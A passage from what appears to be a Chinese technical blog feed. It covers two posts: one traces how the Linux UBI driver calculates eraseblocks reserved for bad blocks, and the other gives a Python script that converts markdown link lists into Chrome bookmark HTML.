title="print_dev_info"></a>print_dev_info</h3><pre><code class="c">static int print_dev_info(libubi_t libubi, int dev_num, int all)&#123;    int i, err, first = 1;    struct ubi_dev_info dev_info;    struct ubi_vol_info vol_info;    err = ubi_get_dev_info1(libubi, dev_num, &amp;dev_info);    if (err)        return sys_errmsg(&quot;cannot get information about UBI device %d&quot;, dev_num);    printf(&quot;ubi%d\n&quot;, dev_info.dev_num);    printf(&quot;Volumes count:                           %d\n&quot;, dev_info.vol_count);    printf(&quot;Logical eraseblock size:                 &quot;);    util_print_bytes(dev_info.leb_size, 0);    printf(&quot;\n&quot;);    printf(&quot;Total amount of logical eraseblocks:     %d (&quot;, dev_info.total_lebs);    util_print_bytes(dev_info.total_bytes, 0);    printf(&quot;)\n&quot;);    printf(&quot;Amount of available logical eraseblocks: %d (&quot;, dev_info.avail_lebs);    util_print_bytes(dev_info.avail_bytes, 0);    printf(&quot;)\n&quot;);    printf(&quot;Maximum count of volumes                 %d\n&quot;, dev_info.max_vol_count);    printf(&quot;Count of bad physical eraseblocks:       %d\n&quot;, dev_info.bad_count);    printf(&quot;Count of reserved physical eraseblocks:  %d\n&quot;, dev_info.bad_rsvd);    printf(&quot;Current maximum erase counter value:     %lld\n&quot;, dev_info.max_ec);    printf(&quot;Minimum input/output unit size:          %d %s\n&quot;,           dev_info.min_io_size, dev_info.min_io_size &gt; 1 ? &quot;bytes&quot; : &quot;byte&quot;);    printf(&quot;Character device major/minor:            %d:%d\n&quot;,           dev_info.major, dev_info.minor);    if (dev_info.vol_count == 0)        return 0;    printf(&quot;Present volumes:                         &quot;);    for (i = dev_info.lowest_vol_id;         i &lt;= dev_info.highest_vol_id; i++) &#123;        err = ubi_get_vol_info1(libubi, dev_info.dev_num, i, &amp;vol_info);        if (err == -1) &#123;            if (errno == ENOENT)                continue;            return sys_errmsg(&quot;libubi failed to probe volume %d on ubi%d&quot;,                      i, dev_info.dev_num);        &#125;        if (!first)            printf(&quot;, %d&quot;, i);        else &#123;            printf(&quot;%d&quot;, i);            first = 0;        &#125;    &#125;    printf(&quot;\n&quot;);    if (!all)        return 0;    first = 1;    printf(&quot;\n&quot;);    for (i = dev_info.lowest_vol_id;         i &lt;= dev_info.highest_vol_id; i++) &#123;        if(!first)            printf(&quot;-----------------------------------\n&quot;);        err = ubi_get_vol_info1(libubi, dev_info.dev_num, i, &amp;vol_info);        if (err == -1) &#123;            if (errno == ENOENT)                continue;            return sys_errmsg(&quot;libubi failed to probe volume %d on ubi%d&quot;,                      i, dev_info.dev_num);        &#125;        first = 0;        err = print_vol_info(libubi, dev_info.dev_num, i);        if (err)            return err;    &#125;    return 0;&#125;</code></pre><p>ref: <a href="http://git.infradead.org/mtd-utils.git/blob/639b871fe3d2cb3e73d21363e8c13ede2bbd9f99:/ubi-utils/ubinfo.c">http://git.infradead.org/mtd-utils.git/blob/639b871fe3d2cb3e73d21363e8c13ede2bbd9f99:/ubi-utils/ubinfo.c</a></p><p>打印保留size的是下面这一行，对应变量<code>dev_info.bad_rsvd</code></p><pre><code class="c">printf(&quot;Count of reserved physical eraseblocks:  %d\n&quot;, dev_info.bad_rsvd);</code></pre><h3 id="追踪-bad-rsvd"><a href="#追踪-bad-rsvd" class="headerlink" title="追踪 bad_rsvd"></a>追踪 bad_rsvd</h3><p>根据 <code>dev_info.bad_rsvd</code> 这个变量可以逐步逆向追溯到信息来源</p><p><img src="/assets/linux/get-bad_rsvd.png" alt="print_dev_info 函数调用关系"></p><p>从以上函数调用关系可以看出，饶了一大圈，实际上就是读了个文件里的值，没错，这个值就是存在<code>/sys/class/ubi/ubi0/reserved_for_bad</code>文件里</p><pre><code class="sh">root:/sys/devices/virtual/ubi/ubi0# lsavail_eraseblocks  max_ec             reserved_for_bad   ubi0_2bad_peb_count      max_vol_count      subsystem          ubi0_3bgt_enabled        min_io_size        total_eraseblocks  ubi0_4dev                mtd_num            ubi0_0             ueventeraseblock_size    power              ubi0_1             volumes_countroot:/sys/devices/virtual/ubi/ubi0# cat reserved_for_bad20</code></pre><p>在目录<code>/sys/class/ubi/ubi0</code>下还可以看到其它ubi信息，比如avail_eraseblocks（可用块）, bad_peb_count（坏块个数）等。</p><p>好啦，用户空间就到这吧，我们已经搞清楚了<code>ubinfo -a</code>的信息来源是系统目录下的文件，当然我们也可以很容易猜到这些文件是系统内核产生的，确切的说是UBI驱动程序产生的。</p><h2 id="内核空间"><a href="#内核空间" class="headerlink" title="内核空间"></a>内核空间</h2><p>接下来看内核空间的UBI驱动部分，查找底层驱动是如何计算坏块保留大小的。</p><p>根据开机过程的UBI log，在linux内核的<code>drivers/mtd/ubi/</code>目录grep搜索相关字符串（如&quot;PEBs reserved for bad PEB handling&quot;），可以找到打印这些log的函数<code>ubi_attach_mtd_dev</code>.</p><h3 id="ubi-attach-mtd-dev"><a href="#ubi-attach-mtd-dev" class="headerlink" title="ubi_attach_mtd_dev"></a>ubi_attach_mtd_dev</h3><p>该函数用于附加MTD device到UBI并分配@ubi_num给新创建的UBI设备，在附加过程中会打印UBI设备的相关信息，也就是<a href="#UBI-attach">UBI attach</a>部分的console log.</p><pre><code class="c">int ubi_attach_mtd_dev(struct mtd_info *mtd, int ubi_num,            int vid_hdr_offset, int max_beb_per1024)&#123;  struct ubi_device *ubi;  int i, err, ref = 0;  /*省略部分代码*/  ubi_msg(&quot;attached mtd%d (name \&quot;%s\&quot;, size %llu MiB) to ubi%d&quot;,     mtd-&gt;index, mtd-&gt;name, ubi-&gt;flash_size &gt;&gt; 20, ubi_num);  ubi_msg(&quot;PEB size: %d bytes (%d KiB), LEB size: %d bytes&quot;,     ubi-&gt;peb_size, ubi-&gt;peb_size &gt;&gt; 10, ubi-&gt;leb_size);  ubi_msg(&quot;min./max. I/O unit sizes: %d/%d, sub-page size %d&quot;,     ubi-&gt;min_io_size, ubi-&gt;max_write_size, ubi-&gt;hdrs_min_io_size);  ubi_msg(&quot;VID header offset: %d (aligned %d), data offset: %d&quot;,     ubi-&gt;vid_hdr_offset, ubi-&gt;vid_hdr_aloffset, ubi-&gt;leb_start);  ubi_msg(&quot;good PEBs: %d, bad PEBs: %d, corrupted PEBs: %d&quot;,     ubi-&gt;good_peb_count, ubi-&gt;bad_peb_count, ubi-&gt;corr_peb_count);  ubi_msg(&quot;user volume: %d, internal volumes: %d, max. volumes count: %d&quot;,     ubi-&gt;vol_count - UBI_INT_VOL_COUNT, UBI_INT_VOL_COUNT,     ubi-&gt;vtbl_slots);  ubi_msg(&quot;max/mean erase counter: %d/%d, WL threshold: %d, image sequence number: %u&quot;,     ubi-&gt;max_ec, ubi-&gt;mean_ec, CONFIG_MTD_UBI_WL_THRESHOLD,     ubi-&gt;image_seq);  ubi_msg(&quot;available PEBs: %d, total reserved PEBs: %d, PEBs reserved for bad PEB handling: %d&quot;,     ubi-&gt;avail_pebs, ubi-&gt;rsvd_pebs, ubi-&gt;beb_rsvd_pebs);  /*省略部分代码*/&#125;</code></pre><p>ref: <a href="https://elixir.bootlin.com/linux/v3.14.77/source/drivers/mtd/ubi/build.c#L867">https://elixir.bootlin.com/linux/v3.14.77/source/drivers/mtd/ubi/build.c#L867</a></p><p>从函数可以看到打印坏块保留分区的语句：</p><pre><code class="c">ubi_msg(&quot;available PEBs: %d, total reserved PEBs: %d, PEBs reserved for bad PEB handling: %d&quot;,   ubi-&gt;avail_pebs, ubi-&gt;rsvd_pebs, ubi-&gt;beb_rsvd_pebs);</code></pre><p>结合以下变量定义</p><pre><code class="c">/** * struct ubi_device - UBI device description structure * ... * @rsvd_pebs: count of reserved physical eraseblocks * @avail_pebs: count of available physical eraseblocks * @beb_rsvd_pebs: how many physical eraseblocks are reserved for bad PEB *                 handling * @beb_rsvd_level: normal level of PEBs reserved for bad PEB handling * ... */</code></pre><p>ref: <a href="https://elixir.bootlin.com/linux/v3.14.77/source/drivers/mtd/ubi/ubi.h#L383">https://elixir.bootlin.com/linux/v3.14.77/source/drivers/mtd/ubi/ubi.h#L383</a></p><p>可知变量<code>beb_rsvd_pebs</code>对应的就是为坏块预留的大小，<code>beb_rsvd_level</code>是坏块预留的常规等级，这两者有啥联系呢。OK，接下来要做的和用户空间一样，我们进行逆向追踪，看下这两个变量的值是如何获取的。</p><h3 id="追踪-beb-rsvd-pebs"><a href="#追踪-beb-rsvd-pebs" class="headerlink" title="追踪 beb_rsvd_pebs"></a>追踪 beb_rsvd_pebs</h3><p><img src="/assets/linux/get-beb_rsvd_pebs.png" alt="get beb_rsvd_pebs"></p><p>图中虚线代表非直接调用关系，虚线中间的全局变量代表的是两个节点的关联信息，捋一下：</p><ol><li>ubi_eba_init 调用 ubi_calculate_reserved 函数计算出 <code>beb_rsvd_level</code><ul><li>ubi_calculate_reserved 调用了 get_bad_peb_limit 获取 <code>bad_peb_limit</code></li><li>get_bad_peb_limit 调用了其它3个函数计算 <code>bad_peb_limit</code></li></ul></li><li>ubi_eba_init 将 <code>beb_rsvd_level</code> 赋值给 <code>beb_rsvd_level</code></li><li>ubi_attach_mtd_dev 将 <code>beb_rsvd_pebs</code> 打印到 console</li></ol><p>有点绕，没关系，下面按照箭头方向从下往上逐一细说。</p><h3 id="ubi-eba-init"><a href="#ubi-eba-init" class="headerlink" title="ubi_eba_init"></a>ubi_eba_init</h3><p><code>ubi_eba_init</code> 使用ubi信息初始化EBA子系统，但是这个我们不关心，主要看其中一小段代码。</p><pre><code class="c">int ubi_eba_init(struct ubi_device *ubi, struct ubi_attach_info *ai)&#123;   /*省略部分代码*/  if (ubi-&gt;bad_allowed) &#123;    ubi_calculate_reserved(ubi);    if (ubi-&gt;avail_pebs &lt; ubi-&gt;beb_rsvd_level) &#123;      /* No enough free physical eraseblocks */      ubi-&gt;beb_rsvd_pebs = ubi-&gt;avail_pebs;      print_rsvd_warning(ubi, ai);    &#125; else      ubi-&gt;beb_rsvd_pebs = ubi-&gt;beb_rsvd_level;    ubi-&gt;avail_pebs -= ubi-&gt;beb_rsvd_pebs;    ubi-&gt;rsvd_pebs  += ubi-&gt;beb_rsvd_pebs;  &#125;   /*省略部分代码*/&#125;</code></pre><p>在允许坏块，并且有足够PEBs的情况下, <code>beb_rsvd_pebs</code> 等于 <code>beb_rsvd_level</code></p><pre><code class="c">ubi-&gt;beb_rsvd_pebs = ubi-&gt;beb_rsvd_level;</code></pre><p>ok，那接下来的问题是<code>beb_rsvd_level</code>如何得来，继续往下↓</p><h3 id="ubi-calculate-reserved"><a href="#ubi-calculate-reserved" class="headerlink" title="ubi_calculate_reserved"></a>ubi_calculate_reserved</h3><p>从上面的流程图可知，<code>beb_rsvd_level</code> 由 以下函数计算得到。</p><pre><code class="c">/** * ubi_calculate_reserved - calculate how many PEBs must be reserved for bad * eraseblock handling. * @ubi: UBI device description object */void ubi_calculate_reserved(struct ubi_device *ubi)&#123;  /*   * Calculate the actual number of PEBs currently needed to be reserved   * for future bad eraseblock handling.   */  ubi-&gt;beb_rsvd_level = ubi-&gt;bad_peb_limit - ubi-&gt;bad_peb_count;  if (ubi-&gt;beb_rsvd_level &lt; 0) &#123;     ubi-&gt;beb_rsvd_level = 0;     ubi_warn(&quot;number of bad PEBs (%d) is above the expected limit (%d), not reserving any PEBs for bad PEB handling, will use available PEBs (if any)&quot;,        ubi-&gt;bad_peb_count, ubi-&gt;bad_peb_limit);  &#125;&#125;</code></pre><p>这个函数的精髓就一行, <code>beb_rsvd_level</code> 等于坏块限制 <code>bad_peb_limit</code> 减去当前已检测到的坏块数量<code>bad_peb_count</code>.</p><pre><code class="c">ubi-&gt;beb_rsvd_level = ubi-&gt;bad_peb_limit - ubi-&gt;bad_peb_count;</code></pre><p>由于检测到的坏块数量与硬件实际情况有关，我们不深究，接下来继续追溯 <code>bad_peb_limit</code> 的来源。</p><h3 id="get-bad-peb-limit"><a href="#get-bad-peb-limit" class="headerlink" title="get_bad_peb_limit"></a>get_bad_peb_limit</h3><p><code>get_bad_peb_limit</code> 就是用来计算坏块限制的函数，函数中有段注释，大致意思是我们不能保证坏块平均分摊在整个flash芯片，考虑最坏情况，有可能所有坏块都出现在附加了ubi的MTD分区。因此在计算限制大小时使用的是整个flash size.</p><pre><code class="c">static int get_bad_peb_limit(const struct ubi_device *ubi, int max_beb_per1024)&#123;  int limit, device_pebs;  uint64_t device_size;  if (!max_beb_per1024)     return 0;  /*   * Here we are using size of the entire flash chip and   * not just the MTD partition size because the maximum   * number of bad eraseblocks is a percentage of the   * whole device and bad eraseblocks are not fairly   * distributed over the flash chip. So the worst case   * is that all the bad eraseblocks of the chip are in   * the MTD partition we are attaching (ubi-&gt;mtd).   */  device_size = mtd_get_device_size(ubi-&gt;mtd);  device_pebs = mtd_div_by_eb(device_size, ubi-&gt;mtd);  limit = mult_frac(device_pebs, max_beb_per1024, 1024);  /* Round it up */  if (mult_frac(limit, 1024, max_beb_per1024) &lt; device_pebs)     limit += 1;  return limit;&#125;</code></pre><p>这里用到3个函数：</p><ol><li><code>mtd_get_device_size</code> - 获取整个flash芯片的大小</li><li><code>mtd_div_by_eb</code> - 将flash大小换算成eraseblock个数，就是将Bytes单位换算为PEBs</li><li><code>mult_frac</code> - 分数相乘函数，把以PEB为单位的limit值乘以一个坏块系数</li></ol><p>前面两个函数都好理解，单独来看下<code>mult_frac</code>, 这其实是个宏定义，用于分数相乘。</p><pre><code class="c">/* * Multiplies an integer by a fraction, while avoiding unnecessary * overflow or loss of precision. */#define mult_frac(x, numer, denom)( \&#123; \  typeof(x) quot = (x) / (denom); \  typeof(x) rem  = (x) % (denom); \  (quot * (numer)) + ((rem * (numer)) / (denom)); \&#125; \)</code></pre><p>举例说明，假设flash为128MB(134,217,728 Bytes), <code>get_bad_peb_limit</code>函数用到的<code>max_beb_per1024</code>来自于kernel config, 默认值为20，代表每1024 PEBs中最多允许20个坏块，那么对应的limit计算如下：</p><pre><code class="c">device_size = 134217728; /* flash size 128MB */device_pebs = 134217728 / (128 * 1024) = 1024; /* eraseblock: 128KB */limit = mult_frac(device_pebs, max_beb_per1024, 1024) = 1024 * (20 / 1024) = 20;</code></pre><p>最终计算得到<code>bad_peb_limit</code>为20 PEBs, 与 <a href="#ubinfo-a">ubinfo -a</a> 中的结果一致。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文首先从 console log 入手分析了UBI相关配置信息，然后从用户空间和内核空间两个方面分析了UBI信息的来源以及坏块保留大小的计算. 其中坏块保留大小 <code>beb_rsvd_pebs</code> 的计算过程可以归结为：</p><pre><code class="c">/* get_bad_peb_limit */device_size = mtd_get_device_size(ubi-&gt;mtd);device_pebs = mtd_div_by_eb(device_size, ubi-&gt;mtd);limit = mult_frac(device_pebs, max_beb_per1024, 1024);ubi-&gt;bad_peb_limit = get_bad_peb_limit(ubi, max_beb_per1024);/* ubi_calculate_reserved */ubi-&gt;beb_rsvd_level = ubi-&gt;bad_peb_limit - ubi-&gt;bad_peb_count;/* ubi_eba_init */ubi-&gt;beb_rsvd_pebs = ubi-&gt;beb_rsvd_level;</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://elixir.bootlin.com/linux/v3.14.77/source/drivers/mtd/ubi">https://elixir.bootlin.com/linux/v3.14.77/source/drivers/mtd/ubi</a></li><li><a href="http://git.infradead.org/mtd-utils.git">http://git.infradead.org/mtd-utils.git</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Embedded </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> ubi </tag>
            
            <tag> flash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python之markdown转Chrome收藏夹</title>
      <link href="2020/05/03/md2bm/"/>
      <url>2020/05/03/md2bm/</url>
      
        <content type="html"><![CDATA[<p>网上可以搜到很多chrome收藏夹转markdown文档的方法，却鲜有markdown文档转为Chrome收藏夹的方法，不过这种需求也确实不多。我之所以用到，是因为平常会用markdown文档收集一些网站，现在想要转换为Chrome收藏夹，方便访问。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>要实现这个功能倒也不难，因为Chrome的收藏夹本质上也是一个html文件，只不过有其固定的DOM结构而已，所以我们的实现思路很简单。</p><ol><li>导出Chrome已有的收藏夹</li><li>分析导出得到的html文件格式</li><li>将自己需要转成Chrome收藏夹的markdown按相同格式转换为html文件</li><li>在chrome中导入生成后的收藏夹</li></ol><h2 id="收藏夹的DOM结构"><a href="#收藏夹的DOM结构" class="headerlink" title="收藏夹的DOM结构"></a>收藏夹的DOM结构</h2><p>我导出了自己的收藏夹，取出其中一小部分为例进行分析，比较局部是可以反映整体的。</p><pre><code class="html">&lt;!DOCTYPE NETSCAPE-Bookmark-file-1&gt;&lt;!-- This is an automatically generated file.     It will be read and overwritten.     DO NOT EDIT! --&gt;&lt;META HTTP-EQUIV=&quot;Content-Type&quot; CONTENT=&quot;text/html; charset=UTF-8&quot;&gt;&lt;TITLE&gt;Bookmarks&lt;/TITLE&gt;&lt;H1&gt;Bookmarks&lt;/H1&gt;&lt;DL&gt;&lt;p&gt;    &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1499940499&quot; LAST_MODIFIED=&quot;1573567059&quot; PERSONAL_TOOLBAR_FOLDER=&quot;true&quot;&gt;Bookmarks bar&lt;/H3&gt;    &lt;DL&gt;&lt;p&gt;        &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1481956366&quot; LAST_MODIFIED=&quot;1565750292&quot;&gt;不常用&lt;/H3&gt;        &lt;DL&gt;&lt;p&gt;            &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1460906121&quot; LAST_MODIFIED=&quot;1582357904&quot;&gt;设计&lt;/H3&gt;            &lt;DL&gt;&lt;p&gt;                &lt;DT&gt;&lt;A HREF=&quot;https://w3layouts.com/&quot; ADD_DATE=&quot;1460906098&quot; ICON=&quot;data:image/png;base64,&quot;&gt;Free Responsive Mobile Website Templates Designs - w3layouts.com&lt;/A&gt;                &lt;DT&gt;&lt;A HREF=&quot;http://www.hightopo.com/demos/index.html&quot; ADD_DATE=&quot;1472525305&quot; ICON=&quot;data:image/png;base64,&quot;&gt;Hightopo - Everything you need to create cutting-edge 2D and 3D visualization&lt;/A&gt;                &lt;DT&gt;&lt;A HREF=&quot;http://jekyllthemes.org/&quot; ADD_DATE=&quot;1459860502&quot;&gt;Jekyll Themes&lt;/A&gt;            &lt;/DL&gt;&lt;p&gt;            &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1468076322&quot; LAST_MODIFIED=&quot;1538094516&quot;&gt;算法&lt;/H3&gt;            &lt;DL&gt;&lt;p&gt;                &lt;DT&gt;&lt;A HREF=&quot;http://www.pythontip.com/acm/problemCategory&quot; ADD_DATE=&quot;1468076332&quot; ICON=&quot;data:image/png;base64,&quot;&gt;各大OJ题目分类&lt;/A&gt;                &lt;DT&gt;&lt;A HREF=&quot;http://www.acmerblog.com/&quot; ADD_DATE=&quot;1468075312&quot; ICON=&quot;data:image/png;base64,&quot;&gt;Acm之家&lt;/A&gt;            &lt;/DL&gt;&lt;p&gt;            &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1550926992&quot; LAST_MODIFIED=&quot;1582961771&quot;&gt;图标&lt;/H3&gt;            &lt;DL&gt;&lt;p&gt;                &lt;DT&gt;&lt;A HREF=&quot;https://www.emojicopy.com/&quot; ADD_DATE=&quot;1550926923&quot; ICON=&quot;data:image/png;base64,&quot;&gt;EmojiCopy | Simple emoji copy and paste by EmojiOne™&lt;/A&gt;                &lt;DT&gt;&lt;A HREF=&quot;https://www.webfx.com/tools/emoji-cheat-sheet/&quot; ADD_DATE=&quot;1582961771&quot; ICON=&quot;data:image/png;base64,&quot;&gt;🎁 Emoji cheat sheet for GitHub, Basecamp, Slack &amp;amp; more&lt;/A&gt;            &lt;/DL&gt;&lt;p&gt;            &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1412991964&quot; LAST_MODIFIED=&quot;1586250269&quot;&gt;论坛&lt;/H3&gt;            &lt;DL&gt;&lt;p&gt;                &lt;DT&gt;&lt;A HREF=&quot;https://www.qt.io/&quot; ADD_DATE=&quot;1472370392&quot; ICON=&quot;data:image/png;base64,&quot;&gt;Qt&lt;/A&gt;                &lt;DT&gt;&lt;A HREF=&quot;https://freessl.cn/&quot; ADD_DATE=&quot;1566824588&quot; ICON=&quot;data:image/png;base64,&quot;&gt;FreeSSL首页 - FreeSSL.cn 一个申请免费HTTPS证书的网站&lt;/A&gt;            &lt;/DL&gt;&lt;p&gt;        &lt;/DL&gt;&lt;p&gt;        &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1538059196&quot; LAST_MODIFIED=&quot;1569229251&quot;&gt;wiki&lt;/H3&gt;        &lt;DL&gt;&lt;p&gt;            &lt;DT&gt;&lt;A HREF=&quot;https://code.woboq.org/linux/linux/&quot; ADD_DATE=&quot;1528874869&quot; ICON=&quot;data:image/png;base64,&quot;&gt;linux/linux/ Source Tree - Woboq Code Browser&lt;/A&gt;            &lt;DT&gt;&lt;A HREF=&quot;https://www.geeksforgeeks.org/c-programming-language/&quot; ADD_DATE=&quot;1569229251&quot;&gt;C Programming Language - GeeksforGeeks&lt;/A&gt;        &lt;/DL&gt;&lt;p&gt;        &lt;DT&gt;&lt;A HREF=&quot;http://translate.google.cn/&quot; ADD_DATE=&quot;1446427265&quot; ICON=&quot;data:image/png;base64,&quot;&gt;&lt;/A&gt;        &lt;DT&gt;&lt;A HREF=&quot;http://www.litreily.top/&quot; ADD_DATE=&quot;1481438786&quot; ICON=&quot;data:image/png;base64,&quot;&gt;&lt;/A&gt;    &lt;/DL&gt;&lt;p&gt;&lt;/DL&gt;&lt;p&gt;</code></pre><p>以上DOM结构中，每条收藏都有一个<code>&lt;A&gt;</code>标签，该标签有一个base64值对应的是base64编码后的图标，也就是每个收藏的图标，这个不是必须的，为了方便阅读，我将其删除了，并不影响。</p><p>如果使用上面的html文件导入chrome的话，是下面这样的。</p><p><img src="/assets/chrome/example.png" alt="chrome bookmark"></p><p>注意其中两个收藏（谷歌翻译和我的博客主页）没有显示描述信息，这个在chrome中是允许的，因为根据图标就能知道这是什么站点。</p><p>好啦，对比DOM结构和在收藏夹的展示，不难发现规律：</p><ol><li>所有收藏夹中的文件夹无论在哪一个层级，都对应DOM中的一个<code>&lt;DT&gt;&lt;H3&gt;</code>标签</li><li><code>&lt;H3&gt;</code>标签包含属性：<code>ADD_DATE</code>, <code>LAST_MODIFIED</code></li><li>收藏夹中文件夹可以嵌套</li><li>每个<code>&lt;DT&gt;&lt;H3&gt;</code>标签都紧随着一组<code>&lt;DL&gt;&lt;p&gt;</code></li><li>每个<code>&lt;DL&gt;&lt;p&gt;</code>里都包含一个收藏列表</li><li>每条收藏都以<code>&lt;DT&gt;&lt;A&gt;</code>标签组合，对应收藏的链接</li><li><code>&lt;A&gt;</code>标签包含属性：<code>HREF</code>,<code>ADD_DATE</code>,<code>ICON</code></li></ol><p>到此就完成了对收藏夹的分析，下面就可以按照这个格式将markdown转换成相应的html</p><h2 id="markdown转html"><a href="#markdown转html" class="headerlink" title="markdown转html"></a>markdown转html</h2><p>markdown文档格式很简单，同样举例说明，下面是用markdown格式编写的收藏夹。</p><pre><code class="md"># 收藏夹(Favorites)## 常用- [谷歌翻译](http://translate.google.cn/)- [litreily](http://www.litreily.top/)- [Notes](https://litreily.gitbook.io/notes/content/)- [smslit](http://www.smslit.top/)- [github](https://github.com/)- [coding](https://coding.net/user)## 论坛(forum)- [Coding 博客](https://blog.coding.net/)- [图灵社区](http://www.ituring.com.cn/)- [电子发烧友](http://www.elecfans.com/)## 编程(Programming)### 算法(Algorithm)- [Acm之家](http://www.acmerblog.com/)- [各大OJ题目分类](http://www.pythontip.com/acm/problemCategory)### linux- [linux - Elixir - Free Electrons](http://elixir.free-electrons.com/linux/latest/source)</code></pre><p>我们使用Python对其逐行读取处理，处理策略如下：</p><ol><li>新建html文件favorites.html，添加HTML头部信息</li><li>获取当前系统时间作为收藏夹中所有的<code>LAST_MODIFIED</code>和<code>ADD_DATE</code></li><li>将所有以<code>#</code>开头的视为文件夹，添加<code>&lt;DT&gt;&lt;H3&gt;</code>标签，设置时间戳和文件夹名称</li><li>在<code>&lt;DT&gt;&lt;H3&gt;</code>标签后紧跟<code>&lt;DL&gt;&lt;p&gt;</code>标签</li><li>将所有链接替换为<code>&lt;DT&gt;&lt;A&gt;</code>格式，这个需要用到python的正则匹配和替换，非常方便</li><li>在合适的位置添加<code>&lt;/DL&gt;&lt;p&gt;</code>标签，用以封装<code>&lt;DL&gt;&lt;p&gt;</code></li></ol><p>使用该策略编写的Python脚本如下：</p><pre><code class="python">#!/usr/bin/env python3# -*- coding:utf-8 -*-# convert markdown to chrome bookmarks# @author: litreily# @date: 2020-04-25import sysimport timeimport reTIMESTAMP = int(time.time())HTML_HEAD = &quot;&quot;&quot;\&lt;!DOCTYPE NETSCAPE-Bookmark&gt;&lt;!-- This is an automatically generated file.     It will be read and overwritten.     DO NOT EDIT! --&gt;&lt;META HTTP-EQUIV=&quot;Content-Type&quot; CONTENT=&quot;text/html; charset=UTF-8&quot;&gt;&lt;TITLE&gt;Bookmarks&lt;/TITLE&gt;&lt;H1&gt;Bookmarks&lt;/H1&gt;&lt;DL&gt;&lt;p&gt;&quot;&quot;&quot;.format(TIMESTAMP)HTML_END = &quot;&quot;&quot;&lt;/DL&gt;&lt;p&gt;\n&quot;&quot;&quot;GROUP_HEAD = &quot;&quot;&quot;\t&lt;DT&gt;&lt;H3 ADD_DATE=&quot;&#123;ts&#125;&quot; LAST_MODIFIED=&quot;&#123;ts&#125;&quot;&gt;&#123;title&#125;&lt;/H3&gt;\t&lt;DL&gt;&lt;p&gt;&quot;&quot;&quot;GROUP_END = &quot;\t&lt;/DL&gt;&lt;p&gt;\n&quot;MASK = &quot;&quot;&quot;\t&lt;DT&gt;\&lt;A HREF=&quot;&#123;link&#125;&quot; ADD_DATE=&quot;&#123;ts&#125;&quot; ICON=&quot;data:image/png;base64,&#123;icon&#125;&quot;&gt;&#123;title&#125;&lt;/A&gt;&quot;&quot;&quot;def main(input):    with open(input, &#39;r&#39;) as f:        lists = f.readlines()    # open html file to write into    output = open(&#39;favorites.html&#39;, &#39;w&#39;)    output.write(HTML_HEAD)    group_re = re.compile(r&#39;^(#+) +(.*)$&#39;) # eg. ## network    mask_re = re.compile(r&#39;\[(.*)\]\((.*)\)&#39;) # eg. [baidu](https://www.baidu.com)    pre_H_level = 0 # previous Header level, H2 or H3 or ...    for line in lists:        line = line.strip()        m = mask_re.search(line)        if m:            # find link            output.write(MASK.format(link=m.group(2), ts=TIMESTAMP, icon=None, title=m.group(1)))        else:            m = group_re.search(line)            if m:                # find header                cur_H_level = len(m.group(1)) # current Header level                if cur_H_level &lt;= pre_H_level:                    for _ in range(pre_H_level - cur_H_level + 1):                        output.write(GROUP_END)                pre_H_level = cur_H_level                output.write(GROUP_HEAD.format(ts=TIMESTAMP, title=m.group(2)))    output.write(HTML_END)if __name__ == &quot;__main__&quot;:    if len(sys.argv) &lt; 2:        print(&#39;No input files.&#39;)        sys.exit(1)    main(sys.argv[1])</code></pre><p>这个脚本唯一需要注意的一点是：什么时候添加<code>&lt;DL&gt;&lt;p&gt;</code>对应的<code>&lt;/DL&gt;&lt;p&gt;</code>闭合标签？如果在错误位置添加了或者是没添加，都会导致收藏夹嵌套顺序错乱。</p><p>对此我的思路是：对比前后两次markdown中读取到的HEADER层级，比如H2对应2，H3对应3. 前一次<code>pre_H_level</code>，当前<code>cur_H_level</code>，如果<code>cur_H_level</code> &lt;= <code>pre_H_level</code>就需要添加，而且添加个数等于前后两数之差加1.</p><p>举例说明：</p><pre><code class="md">## H2_1...### H3        # pre: H2, cur: H3. cur &gt; pre, 不加...## H2_2       # pre: H3, cur: H2, cur &lt; pre, 加(3-2+1)=2次...## H2_3       # pre: H2, cur: H2, cur = pre, 加(2-2+1)=1次</code></pre><p>当然，这种做法的前提是markdown符合语法要求。</p><h2 id="导入chrome"><a href="#导入chrome" class="headerlink" title="导入chrome"></a>导入chrome</h2><p>使用以上脚本将markdown转换为html</p><pre><code class="sh">./md2bm test.md</code></pre><pre><code class="html">&lt;!DOCTYPE NETSCAPE-Bookmark&gt;&lt;!-- This is an automatically generated file.     It will be read and overwritten.     DO NOT EDIT! --&gt;&lt;META HTTP-EQUIV=&quot;Content-Type&quot; CONTENT=&quot;text/html; charset=UTF-8&quot;&gt;&lt;TITLE&gt;Bookmarks&lt;/TITLE&gt;&lt;H1&gt;Bookmarks&lt;/H1&gt;&lt;DL&gt;&lt;p&gt;    &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1588501602&quot; LAST_MODIFIED=&quot;1588501602&quot;&gt;收藏夹(Favorites)&lt;/H3&gt;    &lt;DL&gt;&lt;p&gt;    &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1588501602&quot; LAST_MODIFIED=&quot;1588501602&quot;&gt;常用&lt;/H3&gt;    &lt;DL&gt;&lt;p&gt;    &lt;DT&gt;&lt;A HREF=&quot;http://translate.google.cn/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;谷歌翻译&lt;/A&gt;    &lt;DT&gt;&lt;A HREF=&quot;http://www.litreily.top/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;litreily&lt;/A&gt;    &lt;DT&gt;&lt;A HREF=&quot;https://litreily.gitbook.io/notes/content/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;Notes&lt;/A&gt;    &lt;DT&gt;&lt;A HREF=&quot;http://www.smslit.top/&quot; 